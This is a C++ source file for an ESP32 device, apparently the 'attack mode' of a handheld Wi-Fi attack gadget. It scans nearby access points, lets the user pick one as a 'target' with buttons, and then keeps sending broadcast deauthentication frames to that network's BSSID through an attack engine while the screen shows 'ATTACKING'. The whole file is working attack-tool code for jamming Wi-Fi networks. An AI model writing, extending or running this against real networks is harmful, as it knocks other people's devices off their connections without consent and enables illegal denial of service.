#include "AttackMode.h"
#include <esp_wifi.h>

void AttackMode::begin() {
    attackEngine.begin();
    state = 0;
    performScan();
}

void AttackMode::stop() {
    // Disable promiscuous?
    esp_wifi_set_promiscuous(false);
}

void AttackMode::performScan() {
    // Switch to STA mode to scan safely
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    int n = WiFi.scanNetworks();
    apCount = n > 10 ? 10 : n;
    
    for(int i=0; i<apCount; i++) {
        apList[i] = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + ")";
        uint8_t* bssid = WiFi.BSSID(i);
        memcpy(apBssids[i], bssid, 6);
    }
}

void AttackMode::update() {
    handleInput();
    
    if (state == 2) {
        // Deauthing
        // Send packets continuously
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        attackEngine.sendDeauth(broadcast, apBssids[selectedIndex], 1);
        delay(100); // Throttling
    }
}

void AttackMode::handleInput() {
    inputMgr.update();
    
    if (inputMgr.wasJustPressed(PIN_BTN_DOWN)) {
        selectedIndex++;
        if (selectedIndex >= apCount) selectedIndex = 0;
    }
    
    if (inputMgr.wasJustPressed(PIN_BTN_UP)) {
        selectedIndex--;
        if (selectedIndex < 0) selectedIndex = apCount - 1;
    }
    
    if (inputMgr.wasJustPressed(PIN_BTN_SELECT)) {
        if (state == 0) {
            state = 2; // Start Deauth immediately for demo
        } else {
            state = 0; // Stop
        }
    }
    
    // Potentiometer Check (Use as "Back" gesture if fully CCW?)
    if (inputMgr.getPotPercent() < 5) {
        changeFeature(FEATURE_MENU);
    }
}

void AttackMode::draw() {
    if (state == 0) {
        // Draw list
        const char* menuItems[10];
        for(int i=0; i<apCount; i++) menuItems[i] = apList[i].c_str();
        displayMgr.drawMenu("Select Target", menuItems, apCount, selectedIndex);
    } else if (state == 2) {
        displayMgr.clear();
        displayMgr.drawStatus("ATTACKING", "Sending Deauths...");
        displayMgr.drawText(0, 30, "Target: " + apList[selectedIndex]);
        displayMgr.drawText(0, 50, "PRESS SELECT TO STOP", 10);
        displayMgr.display();
    }
}
